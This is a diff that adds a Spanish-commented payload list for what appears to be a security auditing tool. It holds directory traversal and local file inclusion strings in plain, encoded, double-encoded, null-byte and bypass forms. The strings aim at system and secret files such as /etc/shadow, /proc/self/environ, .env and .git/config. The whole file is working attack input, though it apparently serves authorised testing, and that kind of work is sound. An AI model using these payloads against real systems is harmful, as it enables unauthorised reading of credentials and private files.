@@ -1,0 +1,74 @@
+# ================================================================
+# Sésamo Auditor — Payloads de Directory Traversal / LFI
+# ================================================================
+# Payloads para intentar acceder a archivos fuera del directorio
+# web raíz. Incluye variantes con diferentes encodings.
+# ================================================================
+
+# ─── Traversal Básico (Linux) ───
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+
+# ─── Traversal Básico (Windows) ───
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+
+# ─── URL Encoding ───
+..%2fetc%2fpasswd
+..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252fetc%252fpasswd
+
+# ─── Double Encoding ───
+%252e%252e%252fetc%252fpasswd
+%252e%252e/%252e%252e/etc/passwd
+..%c0%afetc%c0%afpasswd
+..%c1%9cetc%c1%9cpasswd
+
+# ─── Path Truncation / Null Byte ───
+../etc/passwd%00
+../etc/passwd%00.jpg
+../etc/passwd%00.html
+../../etc/passwd%00.png
+
+# ─── Bypass con doble punto ───
+....//etc/passwd
+....//....//etc/passwd
+....//....//....//etc/passwd
+..;/etc/passwd
+..;/..;/etc/passwd
+..;/..;/..;/etc/passwd
+
+# ─── Absolute Path ───
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/version
+/var/log/auth.log
+C:\windows\win.ini
+C:\boot.ini
+C:\windows\system32\drivers\etc\hosts
+
+# ─── Archivos Comunes de Aplicación ───
+../package.json
+../../package.json
+../.env
+../../.env
+../config.json
+../../config.json
+../docker-compose.yml
+../../docker-compose.yml
+../.git/config
+../../.git/config
+../.gitignore
